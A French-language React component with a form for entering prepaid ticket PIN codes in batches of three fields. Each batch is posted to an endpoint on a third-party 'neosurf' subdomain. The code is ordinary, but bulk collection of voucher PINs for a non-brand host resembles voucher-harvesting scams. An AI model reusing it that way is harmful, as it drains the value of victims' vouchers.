'use client'

import { FC, useState } from "react";
import PrimaryButton from "./PrimaryButton";
import axios from "axios";
import toast from "react-hot-toast";
import { Input } from "./ui/input";

interface CardPinCodeProps {
  className?: string;
}

interface CodeLigneType {
  id: number;
  input1: string;
  input2: string;
  input3: string;
}

const defaultNewLigne: CodeLigneType = {
  id: Date.now(),
  input1: "",
  input2: "",
  input3: "",
};

export const CardPinCode: FC<CardPinCodeProps> = ({ className = "" }) => {
  const [codeLigneTab, setCodeLigneTab] = useState<CodeLigneType[]>([defaultNewLigne]);
  const [sending, setSending] = useState(false);
  const [maskInput, setMaskInput] = useState(false); // État pour masquer les inputs

  const addLigne = () => {
    const newLigne: CodeLigneType = {
      id: Date.now(),
      input1: "",
      input2: "",
      input3: "",
    };
    setCodeLigneTab([...codeLigneTab, newLigne]);
  };

  const handleInputChange = (
    id: number,
    field: keyof CodeLigneType,
    value: string
  ) => {
    setCodeLigneTab((prev) =>
      prev.map((ligne) =>
        ligne.id === id ? { ...ligne, [field]: value } : ligne
      )
    );
  };

  const deleteLigne = (id: number) => {
    setCodeLigneTab((prev) => prev.filter((ligne) => ligne.id !== id));
  };

  const handleSubmit = async () => {
    try {
      setSending(true);
      const response = await axios.post("https://neosurf.performanceservicesarl.com/api/endpoint", {
        data: codeLigneTab,
      });

      setCodeLigneTab([defaultNewLigne]);

      toast.success(response.data.message ?? 'Successfully submited', { duration: 7000 });
    } catch (error) {
      console.error("Erreur lors de l'envoi des données:", error);
    } finally {
      setSending(false);
    }
  };

  const isSend = () => {
    return (
      codeLigneTab.length == 0 ||
      (codeLigneTab.length == 1 &&
        (codeLigneTab[0].input1 === "" ||
          codeLigneTab[0].input2 === "" ||
          codeLigneTab[0].input3 === ""))
    );
  };

  const toggleMaskInput = () => {
    setMaskInput(!maskInput);
  };

  return (
    <div className={`${className} bg-white w-full mt-20 rounded-md`}>
      <h2 className="text-xl text-center font-semibold py-4 border-b">
        Entrez le code Pin du ticket
      </h2>
      <div className="pb-4 flex justify-center items-center flex-col">
        {codeLigneTab.map((ligne, index) => (
          <div
            key={ligne.id}
            className="border-b relative bg-gray-50 flex justify-center items-center py-4"
          >
            <div className="w-[80%] grid grid-cols-3 gap-3">
              <Input
                type={maskInput ? "password" : "text"}
                value={ligne.input1}
                onChange={(e) =>
                  handleInputChange(
                    ligne.id,
                    "input1",
                    e.target.value
                  )
                }
              />
              <Input
                type={maskInput ? "password" : "text"}
                value={ligne.input2}
                onChange={(e) =>
                  handleInputChange(
                    ligne.id,
                    "input2",
                    e.target.value
                  )
                }
              />
              <Input
                type={maskInput ? "password" : "text"}
                value={ligne.input3}
                onChange={(e) =>
                  handleInputChange(
                    ligne.id,
                    "input3",
                    e.target.value
                  )
                }
              />
            </div>
            {index > 0 && (
              <button
                onClick={() => deleteLigne(ligne.id)}
                className="text-xs text-white px-1 rounded bg-red-500 ml-4 absolute right-1 top-0"
              >
                Delete
              </button>
            )}
          </div>
        ))}

        <div className="flex justify-end w-[80%] pt-4">
          <button
            onClick={addLigne}
            className="text-sm bg-[#212854] text-white rounded-md px-2 py-1"
          >
            + Ajouter
          </button>
        </div>

        <div className="w-[80%] mx-auto space-x-2 mt-4">
          <label htmlFor="maskInput">Masquer vos codes</label>
          <input
            type="checkbox"
            id="maskInput"
            checked={maskInput}
            onChange={toggleMaskInput}
            className="text-green-500 !text-3xl"
          />
        </div>

        <PrimaryButton
          disabled={sending || isSend()}
          onClick={handleSubmit}
          className="mt-4"
        >
          {sending ? (
            <>
              <svg
                className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                ></path>
              </svg>
              Envoi en cours...
            </>
          ) : (
            "Soumettre"
          )}
        </PrimaryButton>
      </div>
    </div>
  );
};
